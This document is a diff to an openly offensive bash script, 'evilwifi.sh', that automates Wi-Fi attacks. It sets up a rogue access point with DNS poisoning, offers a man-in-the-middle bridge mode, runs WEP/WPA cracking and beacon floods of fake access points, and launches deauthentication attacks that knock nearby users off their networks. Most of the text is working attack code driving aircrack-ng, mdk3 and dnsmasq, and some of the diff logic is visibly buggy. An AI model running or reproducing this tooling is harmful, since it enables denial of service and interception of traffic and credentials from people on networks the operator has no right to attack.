@@ -1,11 +1,11 @@
 #!/bin/bash
-# Hacker Busters - accesspoint.sh         Copyright(c) 2012 Hacker Busters, Inc.
+# Hacker Busters - evilwifi.sh             Copyright(c) 2012 Hacker Busters, Inc.
 #                                                           All rights Reserved.
 # copyright@hackerbusters.ca                            http://hackerbusters.ca
 ####################
 # GLOBAL VARIABLES #
 ####################
-REVISION=049
+REVISION=050
 function todo(){
 echo "TODO LIST FOR NEWER REVISIONS"
 echo "- Cleanup Errors On Script Exit"
@@ -28,12 +28,13 @@ DHCPL=1h                   #time for dhcp lease
 ######################
 # END CONFIG SECTION #
 ######################
+termwidth=130
 folder=~/.evilwifi
-path=`pwd`
+initpath=`pwd`
 if [ -d "$folder" ]; then mkdir $folder 2> /dev/null; fi
 settings=$folder/evilwifi.conf
 sessionfolder=~/.evilwifi/SESSION_$RANDOM
-LOG=$sessionfolder/accesspoint.log
+LOG=$sessionfolder/evilwifi.log
 touch $LOG
 touch $sessionfolder/LOG/missing.log
 ######################
@@ -80,13 +81,11 @@ exit 0
 trap control_c INT
 function cleanup(){
 ifconfig $ATHIFACE down
-mv $LOG $HOME/accesspoint.log
-rm -rf $folder
 mv $APACHECONF/default~ $APACHECONF/default
 dhcpconf=/etc/dhcp3/dhcpd.conf
 echo > $dhcpconf
 echo > /etc/dnsmasq.conf
-echo "Log File: $HOME/accesspoint.log"
+echo "Log File: $folder/evilwifi.log"
 }
 function pinginternet(){
 INTERNETTEST=$(awk '/bytes from/ { print $1 }' < <(ping 8.8.8.8 -c 1 -w 3))
@@ -144,7 +143,7 @@ if [ -d "/usr/src/aircrack-ng" ]; then rm -rfv aircrack-ng; fi
 svn co http://trac.aircrack-ng.org/svn/trunk/ aircrack-ng
 cd aircrack-ng
 make && make install
-cd $folder
+cd $initpath
 }
 function stopshit(){
 service apache2 stop &>$LOG
@@ -213,7 +212,7 @@ echo "allow unknown-clients;" >> $dhcpconf
 echo "one-lease-per-client false;" >> $dhcpconf
 echo "}" >> $dhcpconf
 # echo "}" >> $dhcpconf
-gnome-terminal --geometry=130x15 --hide-menubar --title=DHCP-"$ESSID" -e \
+gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title=DHCP-"$ESSID" -e \
 "dhcpd3 -d -f -cf $dhcpconf -pf /var/run/dhcpd/at0.pid at0"
 }
 function dnsmasqserver(){
@@ -240,7 +239,7 @@ if [ "$mode" = "1" ]; then startdnsmasq; fi
 if [ "$mode" = "2" ]; then startdnsmasqresolv; fi
 }
 function udhcpdserver(){
-gnome-terminal --geometry=130x15 --hide-menubar --title=DHCP-"$ESSID" -e \
+gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title=DHCP-"$ESSID" -e \
 "udhcpd"
 }
 function brlan(){
@@ -253,12 +252,12 @@ ifconfig br-lan up
 iptables -A FORWARD -i br-lan -j ACCEPT
 echo ""
 echo "* ATTEMPTING TO BRIDGE ON $LANIFACE (br-lan) *"
-dhclient3 br-lan &>$folder/bridge.log
-BRLANDHCP=$(awk '/DHCPOFFERS/ { print $1 }' < <(cat $folder/bridge.log))
+dhclient3 br-lan &>$sessionfolder/bridge.log
+BRLANDHCP=$(awk '/DHCPOFFERS/ { print $1 }' < <(cat $sessionfolder/bridge.log))
 while [ "$BRLANDHCP" = "No" ]; do
 echo ""
 echo "* No DHCP Server Found On $LANIFACE (br-lan) [$FAIL] *"
-rm $folder/bridge.log
+rm $sessionfolder/bridge.log
 brlandown
 sleep 2
 brlan
@@ -312,10 +311,10 @@ ifconfig $ATHIFACE down
 sleep 2
 }
 function monitormodestart(){
-airmon-ng check kill > $folder/monitormodepslist.txt
+airmon-ng check kill > $sessionfolder/monitormodepslist.log
 echo "* ATTEMPTING TO START MONITOR-MODE ($ATHIFACE) *"
-airmon-ng start $ATHIFACE $CHAN > $folder/monitormode.txt
-MONIFACE=`awk '/enabled/ { print $5 }' $folder/monitormode.txt | head -c -2`
+airmon-ng start $ATHIFACE $CHAN > $sessionfolder/monitormode.log
+MONIFACE=`awk '/enabled/ { print $5 }' $sessionfolder/monitormode.log | head -c -2`
 if [ "$SPOOFMAC" != "" ]; then
 macchanger -m $SPOOFMAC $MONIFACE
 fi
@@ -336,16 +335,16 @@ echo "| Choose You're Poison?             |"
 echo "+===================================+"
 echo "| 1) Attack Mode | *DEFAULT*         "
 echo "| 2) Bridge Mode | Man In The Middle "
-echo "| 3) Capture IVs For WEP Attack      "
-echo "| U) Update Script To The Latest     "
-echo "| Q) Quit Mode | YOU SUCK LOOSER     "
+echo "| 3) WEP/WPA Hack | AutoPwn          "
+echo "| 4) Beacon Flood | Fake AP Flood    "
+echo "| 5) Deauth Mode | Boot People Off   "
+echo "| *) Quit Mode | YOU SUCK LOOSER     "
 echo "+===================================+"
 echo ""
 read -e -p "Option: " mode
 echo ""
 if [ "$mode" = "" ]; then clear; poisonmenu; fi
-if [ "$mode" = "U" ]; then update; fi
-if [ "$mode" = "Q" ]; then echo "QUITER!!!!!!!!!!!!!"; sleep 5; exit 0; fi
+if [ "$mode" != "1-5" ]; then echo "QUITER!!!!!!!!!!!!!"; sleep 5; exit 0; fi
 }
 function verbosemenu(){
 echo "+===================================+"
@@ -396,13 +395,13 @@ function startdnsmasq(){
 echo "no-poll" >> /etc/dnsmasq.conf
 echo "no-resolv" >> /etc/dnsmasq.conf
 echo "* DNSMASQ DNS POISON!!! *"
-gnome-terminal --geometry=133x35 --hide-menubar --title=DNSERVER -e \
+gnome-terminal --geometry="$termwidth"x35 --hide-menubar --title=DNSERVER -e \
 "dnsmasq --no-daemon --interface=at0 --except-interface=lo -C /etc/dnsmasq.conf"
 }
 function startdnsmasqresolv(){
 echo "dhcp-option=wirelesslan,6,$at0IP,8.8.8.8" >> /etc/dnsmasq.conf
 echo "* DNSMASQ With Internet *"
-gnome-terminal --geometry=134x35 --hide-menubar --title=DNSERVER -e \
+gnome-terminal --geometry="$termwidth"x35 --hide-menubar --title=DNSERVER -e \
 "dnsmasq --no-daemon --interface=at0 --except-interface=lo -C /etc/dnsmasq.conf"
 }
 function nodhcpserver(){
@@ -422,13 +421,13 @@ echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4
 chmod a+x $folder/probe.sh
 chmod a+x $folder/pwned.sh
 chmod a+x $folder/web.sh
-gnome-terminal --geometry=134x35 --hide-menubar --title=WEB -e "/bin/bash $folder/web.sh"
-gnome-terminal --geometry=134x17 --hide-menubar --title=PWNED -e "/bin/bash $folder/pwned.sh"
-gnome-terminal --geometry=134x17 --hide-menubar --title=PROBE -e "/bin/bash $folder/probe.sh"
+gnome-terminal --geometry="$termwidth"x35 --hide-menubar --title=WEB -e "/bin/bash $folder/web.sh"
+gnome-terminal --geometry="$termwidth"x17 --hide-menubar --title=PWNED -e "/bin/bash $folder/pwned.sh"
+gnome-terminal --geometry="$termwidth"x17 --hide-menubar --title=PROBE -e "/bin/bash $folder/probe.sh"
 #VICTIMMAC=awk '{printf("$2")}' < <(`tail -f dnsmasq.leases`)
 #VICTIMIP=
 #VICTHOST=$(awk '/$VICTIMMAC/ {printf("$4")}')
-#gnome-terminal --geometry=130x15 --hide-menubar --title="APACHE2 ERROR.LOG" -e \
+#gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title="APACHE2 ERROR.LOG" -e \
 #"tail -f /var/log/apache2/error.log"
 }
 function deauth(){
@@ -436,12 +435,11 @@ echo ""
 echo "+===================================+"
 echo "| SCANNING NEARBY WIFIS             |"
 echo "+===================================+"
-iwlist $ATHIFACE scan | awk '/Address/ {print $5}' > $folder/scannedwifimaclist.txt
-echo "a/$MAC|any" > $folder/droprules.txt
-echo "d/any|any" >> $folder/droprules.txt
-echo "$MAC" > $folder/whitelist.txt
+iwlist $ATHIFACE scan | awk '/Address/ {print $5}' > $sessionfolder/scannedwifimaclist.txt
+echo "a/$MAC|any" > $sessionfolder/droprules.txt
+echo "d/any|any" >> $sessionfolder/droprules.txt
+echo "$MAC" > $sessionfolder/whitelist.txt
 isempty=$(ls -l $folder | awk '/scannedwifimaclist.txt/ {print $5}')
-read -e -p "List of APs (wifilist.txt) *optional* " WIFILIST
 echo ""
 echo "+===================================+"
 echo "| DEAUTH PEOPLE                      "
@@ -454,65 +452,69 @@ echo ""
 read -e -p "Option: " DEAUTHPROG
 if [ "$DEAUTHPROG" = "1" ]; then
 DEAUTHPROG=mdk3
-gnome-terminal --geometry=130x15 --hide-menubar -e "mdk3 $MONIFACE d -c $CHAN -w $folder/whitelist.txt"
+gnome-terminal --geometry="$termwidth"x15 --hide-menubar -e "mdk3 $MONIFACE d -c $CHAN -w $sessionfolder/whitelist.txt"
 fi
 if [ "$DEAUTHPROG" = "3" ]; then
 DEAUTHPROG=airdrop-ng
-gnome-terminal --geometry=130x15 --hide-menubar --title="AIRODUMP-NG" -e \
-"airodump-ng --output-format csv --write $FOLDER/dump.csv $MONIFACE"
+gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title="AIRODUMP-NG" -e \
+"airodump-ng --output-format csv --write $sessionfolder/dump.csv $MONIFACE"
 sleep 5
 if [ -f != /usr/sbin/airdrop-ng ]; then
 ln -s /pentest/wireless/airdrop-ng/airdrop-ng /usr/sbin/airdrop-ng
 fi
-gnome-terminal --geometry=130x15 --hide-menubar --title="AIRDROP-NG" -e \
-"airdrop-ng -i $MONIFACE -t $folder/dump.csv-01.csv -r $folder/droprules.txt"
+gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title="AIRDROP-NG" -e \
+"airdrop-ng -i $MONIFACE -t $sessionfolder/dump.csv-01.csv -r $sessionfolder/droprules.txt"
 fi
 if [ "$DEAUTHPROG" = "2" ]; then
 DEAUTHPROG=aireplay-ng
 echo ""
 echo "+===================================+"
-echo "| 3) ESSID | ACCESSPOINT NAME        "
-echo "| 4) APMAC | MAC ADDRESS OF AP       "
+echo "| 1) ESSID | ACCESSPOINT NAME        "
+echo "| 2) APMAC | MAC ADDRESS OF AP       "
+echo "| 3) CLIEN | ATTACK CLIENT           "
 echo "+===================================+"
 echo ""
 read -e -p "Option: " DEAUTHMODE
-if [ "$DEAUTHMODE" = "3" ]; then
-gnome-terminal -e "aireplay-ng -0 $COUNT -e \"$ESSID\" $MONIFACE"
-fi
-if [ "$DEAUTHMODE" = "4" ]; then
+if [ "$DEAUTHMODE" = "1" ]; then
+gnome-terminal -e "aireplay-ng -0 $COUNT -e \"$ESSID\" $MONIFACE"; fi
+if [ "$DEAUTHMODE" = "2" ]; then
 echo ""
 echo "EXAMPLE: aa:bb:cc:dd:ee:ff"
 read -e -p "What Is The APs MAC ADDRESS? " APMAC
-gnome-terminal -e "aireplay-ng -0 $COUNT -a $APMAC $MONIFACE"
+gnome-terminal -e "aireplay-ng -0 $COUNT -a $APMAC $MONIFACE"; fi
+if [ "$DEAUTHMODE" = "3" ]; then
+echo ""
+echo "EXAMPLE: aa:bb:cc:dd:ee:ff"
+read -e -p "What Is The APs MAC ADDRESS? " APMAC
+read -e -p "What Is The CLIENTs MAC ADDRESS? " CLIENTMAC
+gnome-terminal -e "aireplay-ng -0 $COUNT -a $APMAC -c $CLIENTMAC $MONIFACE"; fi
 fi
-fi
-read -e -p "Press Enter To End Deauth Attack " enter
+sleep $COUNT
 killall -q -9 $DEAUTHPROG
-echo "+===================================+"
-echo "| STOP DEAUTH ATTACK                |"
-echo "+===================================+"
 echo ""
 attackmenu
 }
 function beaconflood(){
-if [ -f "$WIFILIST" ]; then
-gnome-terminal --geometry=130x15 --hide-menubar --title="Tons Of Wifi APs" -e \
-"mdk3 $MONIFACE b -f $WIFILIST"
+read -e -p "how many fake aps would you like? (max 30) " end
+if [ "$end" -gt "30" ]; then beaconflood; fi
+read -e -p "use wordlist file? (type yes) " yesno
+if [ "$yesno" = "yes" ]; then
+read -e -p "wordlist File? " file
 else
-start=0 > $folder/mdk3.sh
-read -e -p "how many fake aps would you like? (max 30) " end >> $folder/mdk3.sh
-if [ "$end" -gt "30" ]; then >> $folder/mdk3.sh
-exit >> $folder/mdk3.sh
+read -e -p "what essid? " essid
 fi
-read -e -p "what essid? " essid >> $folder/mdk3.sh
-while [ $start -lt $end ]; do >> $folder/mdk3.sh
-mdk3 $MONIFACE b -n "$essid$RANDOM" >> $folder/mdk3.sh
-let start=start+1 >> $folder/mdk3.sh
-done >> $folder/mdk3.sh
-sleep >> 9999 $folder/mdk3.sh
-chmod 755 $folder/mdk3.sh
-gnome-terminal --geometry=130x15 --hide-menubar --title="Tons Of Wifi APs" -e \
-"$folder/mdk3.sh"
+startmonitormode
+start=0
+while [ $start -lt $end ]; do
+if [ "$yesno" = "yes" ]; then
+essid=`lc="$(($RANDOM % $(wc -l $file|awk '{print $1}')))"; sed -n "${lc}p" $file`
+sleep 2
+fi
+mdk3 $iface b -c $chan -n "$essid$RANDOM" &
+let start=start+1
+done
+sleep 999
+killall mdk3
 fi
 attackmenu
 }
@@ -822,7 +824,7 @@ fi
 airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT -e "$ESSID" $OTHEROPTS $MONIFACE -P -C 15 -v > $folder/airbaseng.log &
 #airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT -e "$ESSID" $OTHEROPTS $MONIFACE -P -C 120 -v > $folder/airbaseng.log &
 sleep 4
-ps aux | awk '/[a]irbase-ng/ { print $2 }' > $folder/airbase-ng.pid
+ps aux | awk '/[a]irbase-ng/ { print $2 }' > $sessionfolder/airbase-ng.pid
 if [ "$mode" != "2" ]; then
 ifconfig at0 up
 ifconfig at0 $at0IP netmask $NETMASK;
@@ -840,8 +842,8 @@ if [ "$ERRORFILE" = "" ]; then ERRORFILE=index.php; fi
 echo "ErrorDocument 404 /$ERRORFILE" > /etc/apache2/conf.d/localized-error-pages
 echo > /var/log/apache2/access.log
 echo > /var/log/apache2/error.log
-ln -s /var/log/apache2/access.log $folder/access.log
-ln -s /var/log/apache2/error.log $folder/error.log
+ln -s /var/log/apache2/access.log $sessionfolder/access.log
+ln -s /var/log/apache2/error.log $sessionfolder/error.log
 APACHECONF=/etc/apache2/sites-available
 if [ -f $APACHECONF/default~ ]; then cp $APACHECONF/default~ $APACHECONF/default;
 else cp $APACHECONF/default $APACHECONF/default~; fi
